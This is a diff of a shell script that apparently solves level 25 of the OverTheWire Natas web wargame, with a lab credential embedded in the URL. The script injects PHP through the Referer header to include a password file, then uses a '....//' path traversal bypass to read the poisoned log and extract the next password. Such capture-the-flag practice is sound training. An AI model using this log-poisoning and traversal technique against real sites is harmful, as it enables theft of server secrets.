@@ -2,7 +2,7 @@
 . ../natas.sh
 natas_url="http://natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c@natas25.natas.labs.overthewire.org"
 function hack() {
-	 request-with-refereer "lang=natas_webpass" "<? include('/etc/natas_webpass/natas26'); ?>" 2>&1
+	 request-with-refereer "lang=natas_webpass" "<? include('/etc/natas_webpass/natas26'); ?>" 1>/dev/null 2>/dev/null
 	 result=$(request "lang=....//logs/natas25_oc1abora817638lrk05h0hta53.log" 2>&1 | grep -Po "[\w\d]{32}")
 	 password=""
 	 for r in $result ; do
